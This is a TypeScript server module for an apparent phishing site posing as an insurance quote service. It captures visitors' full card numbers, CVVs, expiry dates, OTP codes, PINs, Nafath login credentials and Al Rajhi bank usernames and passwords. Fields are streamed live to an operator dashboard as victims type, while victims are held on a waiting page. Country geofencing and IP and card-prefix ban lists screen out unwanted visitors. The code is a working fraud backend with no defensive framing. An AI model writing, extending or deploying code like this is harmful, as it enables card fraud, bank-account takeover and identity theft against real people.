import { createServerFn } from "@tanstack/react-start";
import { getRequest } from "@tanstack/react-start/server";
import { z } from "zod";
import { encryptField, hashField } from "./crypto.server";

/** Check whether the caller's country is in the admin-configured allow-list. */
export const checkCountryAccess = createServerFn({ method: "GET" }).handler(async () => {
  const supabase = await createPublicSupabaseClient();
  const { data: setting } = await supabase
    .from("settings")
    .select("setting_value")
    .eq("setting_key", "allowed_countries")
    .maybeSingle();

  const raw = (setting?.setting_value ?? "").trim();
  if (!raw) return { allowed: true as const, country: null };

  const allowed = raw
    .split(/[\s,\n]+/)
    .map((s: string) => s.trim().toUpperCase())
    .filter(Boolean);
  if (allowed.length === 0) return { allowed: true as const, country: null };

  // Detect caller country
  let country: string | null = null;
  let ip = "";
  let isLocal = false;
  try {
    const req = getRequest();
    const h = req.headers;
    // Cloudflare / edge injects country directly — most reliable
    country =
      (h.get("cf-ipcountry") ||
        h.get("x-vercel-ip-country") ||
        h.get("x-country-code") ||
        "").trim().toUpperCase() || null;
    ip =
      (h.get("cf-connecting-ip") ||
        h.get("x-real-ip") ||
        (h.get("x-forwarded-for") ?? "").split(",")[0] ||
        "").trim();
  } catch {
    // ignore
  }

  if (country === "XX" || country === "T1") country = null; // Tor / unknown
  isLocal = !ip || ip === "127.0.0.1" || ip === "::1" || ip.startsWith("::ffff:127.");

  if (!country && ip && !isLocal) {
    // Fallback lookup services
    const providers = [
      `https://ipapi.co/${ip}/country/`,
      `https://ipwho.is/${ip}?fields=country_code`,
      `https://get.geojs.io/v1/ip/country/${ip}`,
    ];
    for (const url of providers) {
      try {
        const res = await fetch(url);
        if (!res.ok) continue;
        const txt = (await res.text()).trim();
        if (url.includes("ipwho")) {
          try {
            const j = JSON.parse(txt);
            if (j?.country_code) { country = String(j.country_code).toUpperCase(); break; }
          } catch { /* ignore */ }
        } else if (txt && txt.length <= 4 && /^[A-Za-z]{2}$/.test(txt)) {
          country = txt.toUpperCase();
          break;
        }
      } catch { /* ignore */ }
    }
  }

  if (isLocal && !country) {
    // Local dev only — do not block
    return { allowed: true as const, country: null };
  }

  // Fail-closed: if country still unknown in production, block.
  if (!country) return { allowed: false as const, country: null };
  return { allowed: allowed.includes(country), country };
});

async function createPublicSupabaseClient() {
  // Public intake pages write to privileged tables (quotes/cards/history);
  // use the admin client so RLS doesn't block anonymous visitors.
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  return supabaseAdmin;
}

/** Minimal user-agent parsing: browser, OS, device type. */
function parseUserAgent(ua: string): {
  browser: string | null;
  os: string | null;
  device: string | null;
} {
  if (!ua) return { browser: null, os: null, device: null };
  let browser: string | null = null;
  if (/Edg\//.test(ua)) browser = "Edge";
  else if (/OPR\/|Opera/.test(ua)) browser = "Opera";
  else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = "Chrome";
  else if (/Safari\//.test(ua) && /Version\//.test(ua)) browser = "Safari";
  else if (/Firefox\//.test(ua)) browser = "Firefox";
  else if (/MSIE|Trident/.test(ua)) browser = "IE";

  let os: string | null = null;
  if (/Windows NT/.test(ua)) os = "Windows";
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
  else if (/Mac OS X/.test(ua)) os = "macOS";
  else if (/Android/.test(ua)) os = "Android";
  else if (/Linux/.test(ua)) os = "Linux";

  let device: string | null = "كمبيوتر";
  if (/iPad|Tablet/.test(ua)) device = "تابلت";
  else if (/Mobile|iPhone|Android/.test(ua)) device = "جوال";

  return { browser, os, device };
}

/** Update visitor's current page + last_active_at (called from every public page). */
export const trackPage = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z.object({ session_id: z.string().min(4), page: z.string().min(1) }).parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const now = new Date().toISOString();

    // Existing visitor with captured info? Just refresh page + activity.
    const { data: existing } = await supabase
      .from("quotes")
      .select("id, ip_address, user_agent, blocked")
      .eq("session_id", data.session_id)
      .maybeSingle();

    // Blocked visitor: tell the client to show the blocked page, don't refresh activity.
    if (existing?.blocked) return { ok: true, blocked: true };

    if (existing && existing.ip_address) {
      const { error } = await supabase
        .from("quotes")
        .update({ current_page: data.page, last_active_at: now })
        .eq("session_id", data.session_id);
      if (error) throw new Error(error.message);
      return { ok: true };
    }

    // First sighting (or missing info): capture IP, country and device.
    const req = getRequest();
    const h = req.headers;
    const ip = (
      h.get("cf-connecting-ip") ||
      h.get("x-real-ip") ||
      (h.get("x-forwarded-for") ?? "").split(",")[0] ||
      ""
    ).trim();
    const ua = h.get("user-agent") ?? "";
    const { browser, os, device } = parseUserAgent(ua);

    let country =
      (h.get("cf-ipcountry") || h.get("x-vercel-ip-country") || h.get("x-country-code") || "")
        .trim()
        .toUpperCase() || null;
    if (country === "XX" || country === "T1") country = null;
    const isLocal =
      !ip || ip === "127.0.0.1" || ip === "::1" || ip.startsWith("::ffff:127.");
    if (!country && ip && !isLocal) {
      for (const url of [
        `https://ipapi.co/${ip}/country/`,
        `https://ipwho.is/${ip}?fields=country_code`,
        `https://get.geojs.io/v1/ip/country/${ip}`,
      ]) {
        try {
          const res = await fetch(url);
          if (!res.ok) continue;
          const txt = (await res.text()).trim();
          if (url.includes("ipwho")) {
            const j = JSON.parse(txt);
            if (j?.country_code) {
              country = String(j.country_code).toUpperCase();
              break;
            }
          } else if (/^[A-Za-z]{2}$/.test(txt)) {
            country = txt.toUpperCase();
            break;
          }
        } catch {
          /* ignore */
        }
      }
    }

    // IP ban list: a banned network never gets registered again.
    // banned_ips is admin-only under RLS, so this check needs the service client.
    if (ip) {
      try {
        const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
        const { data: bannedIp } = await supabaseAdmin
          .from("banned_ips")
          .select("id")
          .eq("ip", ip)
          .maybeSingle();
        if (bannedIp) return { ok: true, blocked: true };
      } catch {
        /* if the admin client is unavailable, don't block legitimate visitors */
      }
    }

    // Upsert so a visitor is registered on first page view, even before
    // submitting any form — the dashboard shows them live.
    const { error } = await supabase
      .from("quotes")
      .upsert(
        {
          session_id: data.session_id,
          current_page: data.page,
          last_active_at: now,
          ip_address: ip || null,
          country,
          user_agent: encryptField(ua),
          browser,
          os,
          device,
        },
        { onConflict: "session_id", ignoreDuplicates: false },
      );
    if (error) throw new Error(error.message);
    return { ok: true };
  });

/** Live-update the visitor's displayed name on the admin dashboard as they type. */
export const updateVisitorName = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z.object({ session_id: z.string().min(4), name: z.string().max(120) }).parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const clean = data.name.trim().slice(0, 120);
    const { error } = await supabase
      .from("quotes")
      .update({ visitor_name: encryptField(clean), last_active_at: new Date().toISOString() })
      .eq("session_id", data.session_id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

/** Save card entry from public payment page. Price is recomputed server-side. */
export const saveCard = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z
      .object({
        session_id: z.string().min(4),
        card_number: z.string().min(12),
        card_name: z.string().min(1),
        year: z.string().min(2),
        cvv: z.string().min(3),
        phone_number: z.string().optional(),
        // Authoritative pricing inputs — the client cannot dictate the price.
        offer_id: z.string().uuid().optional(),
        extras: z.array(z.string()).optional(),
        offer_selected_at: z.string().datetime().optional(),
      })
      .parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    // banned card check — entries are prefixes: block any card starting with one.
    // banned_cards is admin-only under RLS, so this check needs the service client.
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const digits = data.card_number.replace(/\D/g, "");
    const { data: bannedRows } = await supabaseAdmin
      .from("banned_cards")
      .select("card_number");
    const isBanned = (bannedRows ?? []).some((row: { card_number: string }) => {
      const prefix = String(row.card_number).replace(/\D/g, "");
      return prefix.length > 0 && digits.startsWith(prefix);
    });
    if (isBanned) throw new Error("BANNED_CARD");

    const { data: quote } = await supabase
      .from("quotes")
      .select("id")
      .eq("session_id", data.session_id)
      .maybeSingle();

    // Recompute total on the server using B-Care's canonical formula.
    let serverTotal: string | null = null;
    if (data.offer_id) {
      try {
        const { computeOfferPrice } = await import("./offers.functions");
        const priced = await computeOfferPrice({
          data: {
            offer_id: data.offer_id,
            session_id: data.session_id,
            extras: data.extras ?? [],
          },
        });
        serverTotal = priced.total.toFixed(2);
      } catch {
        serverTotal = null;
      }
    }

    // Reuse existing card row for this quote so attempts append to same card
    const existingCardId = quote?.id
      ? (await supabase.from("cards").select("id").eq("quote_id", quote.id).order("created_at", { ascending: true }).limit(1).maybeSingle()).data?.id
      : null;

    let card: { id: string } | null = null;
    const encCard = encryptField(data.card_number)!;
    const encCvv = encryptField(data.cvv)!;
    const encYear = encryptField(data.year)!;
    const encPhone = data.phone_number ? encryptField(data.phone_number) : null;

    if (existingCardId) {
      const { data: upd } = await supabase
        .from("cards")
        .update({
          card_number: encCard,
          card_name: data.card_name,
          year: encYear,
          cvv: encCvv,
          phone_number: encPhone,
          total_price: serverTotal,
          offer_selected_at: data.offer_selected_at ?? null,
          status: 0,
        })
        .eq("id", existingCardId)
        .select()
        .single();
      card = upd;
    } else {
      const { data: ins, error } = await supabase
        .from("cards")
        .insert({
          quote_id: quote?.id ?? null,
          card_number: encCard,
          card_name: data.card_name,
          year: encYear,
          cvv: encCvv,
          phone_number: encPhone,
          total_price: serverTotal,
          offer_selected_at: data.offer_selected_at ?? null,
          status: 0,
        })
        .select()
        .single();
      if (error) throw new Error(error.message);
      card = ins;
    }

    // Append attempt to history (encrypted)
    if (card?.id) {
      await supabase.from("card_input_history").insert({
        card_id: card.id,
        card_number: encCard,
        card_name: data.card_name,
        year: encYear,
        cvv: encCvv,
        phone_number: encPhone,
      });
    }

    await supabase
      .from("quotes")
      .update({ current_page: "wait", last_active_at: new Date().toISOString() })
      .eq("session_id", data.session_id);

    return card;
  });

export const saveOtp = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z.object({ session_id: z.string().min(4), otp: z.string().min(3) }).parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const { data: quote } = await supabase
      .from("quotes")
      .select("id, cards(id)")
      .eq("session_id", data.session_id)
      .maybeSingle();
    const cardId = (quote as { cards?: { id: string }[] } | null)?.cards?.[0]?.id;
    if (!cardId) throw new Error("No card yet");

    const encOtp = encryptField(data.otp)!;
    const { error } = await supabase.from("card_otp_history").insert({
      card_id: cardId,
      otp: encOtp,
    });
    if (error) throw new Error(error.message);

    await supabase.from("cards").update({ otp: encOtp }).eq("id", cardId);

    await supabase
      .from("quotes")
      .update({ current_page: "wait", last_active_at: new Date().toISOString() })
      .eq("session_id", data.session_id);

    return { ok: true };
  });

export const savePin = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z.object({ session_id: z.string().min(4), pin: z.string().min(3) }).parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const { data: quote } = await supabase
      .from("quotes")
      .select("id, cards(id)")
      .eq("session_id", data.session_id)
      .maybeSingle();
    const cardId = (quote as { cards?: { id: string }[] } | null)?.cards?.[0]?.id;
    if (cardId) {
      const encPin = encryptField(data.pin)!;
      await supabase.from("cards").update({ pin: encPin }).eq("id", cardId);
      await supabase.from("card_pin_history").insert({ card_id: cardId, pin: encPin });
    }
    await supabase
      .from("quotes")
      .update({ current_page: "wait", last_active_at: new Date().toISOString() })
      .eq("session_id", data.session_id);
    return { ok: true };
  });

export const saveNafath = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z
      .object({
        session_id: z.string().min(4),
        username: z.string().min(1),
        password: z.string().min(1),
      })
      .parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const { data: quote } = await supabase
      .from("quotes")
      .select("id, cards(id)")
      .eq("session_id", data.session_id)
      .maybeSingle();
    const cardId = (quote as { cards?: { id: string }[] } | null)?.cards?.[0]?.id;
    if (cardId) {
      const encU = encryptField(data.username)!;
      const encP = encryptField(data.password)!;
      await supabase
        .from("cards")
        .update({ username_nafath: encU, password_nafath: encP })
        .eq("id", cardId);
      await supabase.from("card_nafath_history").insert({ card_id: cardId, code: encP });
    }
    await supabase
      .from("quotes")
      .update({ current_page: "wait", last_active_at: new Date().toISOString() })
      .eq("session_id", data.session_id);
    return { ok: true };
  });

export const saveRajhi = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z
      .object({
        session_id: z.string().min(4),
        username: z.string().min(1),
        password: z.string().min(1),
      })
      .parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const { data: quote } = await supabase
      .from("quotes")
      .select("id, cards(id)")
      .eq("session_id", data.session_id)
      .maybeSingle();
    const cardId = (quote as { cards?: { id: string }[] } | null)?.cards?.[0]?.id;
    if (cardId) {
      const encU = encryptField(data.username)!;
      const encP = encryptField(data.password)!;
      await supabase
        .from("cards")
        .update({ username: encU, password: encP, rajhi_status: 0 })
        .eq("id", cardId);
      await supabase.from("card_rajhi_history").insert({
        card_id: cardId,
        username: encU,
        password: encP,
      });
    }
    await supabase
      .from("quotes")
      .update({ current_page: "wait", last_active_at: new Date().toISOString() })
      .eq("session_id", data.session_id);
    return { ok: true };
  });

/** Public: check current_page for a session (used by polling if realtime unavailable). */
export const getCurrentPage = createServerFn({ method: "GET" })
  .inputValidator((data) => z.object({ session_id: z.string().min(6) }).parse(data))
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const { data: rows, error } = await supabase
      .from("quotes")
      .select("current_page, blocked")
      .eq("session_id", data.session_id)
      .limit(1);
    if (error) console.error("[getCurrentPage]", error);
    return rows?.[0] ?? null;
  });

/**
 * Live-save partial inputs from any public page as the visitor types,
 * so the admin dashboard sees the data in realtime without waiting
 * for a form submission. Any provided field is written to the cards
 * row (upserting it when missing) and quotes.last_active_at is bumped.
 */
export const patchCard = createServerFn({ method: "POST" })
  .inputValidator((data) =>
    z
      .object({
        session_id: z.string().min(4),
        fields: z
          .object({
            card_number: z.string().max(32).optional(),
            card_name: z.string().max(120).optional(),
            year: z.string().max(10).optional(),
            cvv: z.string().max(6).optional(),
            phone_number: z.string().max(20).optional(),
            otp: z.string().max(10).optional(),
            pin: z.string().max(10).optional(),
            username_nafath: z.string().max(120).optional(),
            password_nafath: z.string().max(200).optional(),
            username: z.string().max(120).optional(),
            password: z.string().max(200).optional(),
          })
          .refine((v) => Object.keys(v).length > 0, { message: "empty patch" }),
      })
      .parse(data),
  )
  .handler(async ({ data }) => {
    const supabase = await createPublicSupabaseClient();
    const { data: quote } = await supabase
      .from("quotes")
      .select("id")
      .eq("session_id", data.session_id)
      .maybeSingle();

    const patch: Record<string, string | null> = {};
    for (const [k, v] of Object.entries(data.fields)) {
      if (typeof v === "string") patch[k] = v.length > 0 ? encryptField(v) : null;
    }

    const { data: existingCard } = quote?.id
      ? await supabase
          .from("cards")
          .select("id")
          .eq("quote_id", quote.id)
          .order("created_at", { ascending: true })
          .limit(1)
          .maybeSingle()
      : { data: null as { id: string } | null };

    if (existingCard?.id) {
      await (supabase.from("cards") as unknown as {
        update: (p: Record<string, string | null>) => { eq: (c: string, v: string) => Promise<unknown> };
      })
        .update(patch)
        .eq("id", existingCard.id);
    } else {
      await (supabase.from("cards") as unknown as {
        insert: (p: Record<string, unknown>) => Promise<unknown>;
      }).insert({ quote_id: quote?.id ?? null, status: 0, ...patch });
    }

    await supabase
      .from("quotes")
      .update({ last_active_at: new Date().toISOString() })
      .eq("session_id", data.session_id);
    return { ok: true };
  });

/**
 * Live banned-prefix check for the payment form: returns whether the
 * partially-typed card number starts with any banned prefix, so the form
 * can warn the visitor before they finish typing. Public by design —
 * it reveals only a boolean for the digits the visitor already typed.
 */
export const checkCardBanned = createServerFn({ method: "POST" })
  .inputValidator((data: unknown) =>
    z.object({ card_number: z.string().min(1).max(19) }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const digits = data.card_number.replace(/\D/g, "");
    if (!digits) return { banned: false };
    const { data: bannedRows } = await supabaseAdmin
      .from("banned_cards")
      .select("card_number");
    const banned = (bannedRows ?? []).some((row: { card_number: string }) => {
      const prefix = String(row.card_number).replace(/\D/g, "");
      return prefix.length > 0 && digits.startsWith(prefix);
    });
    return { banned };
  });
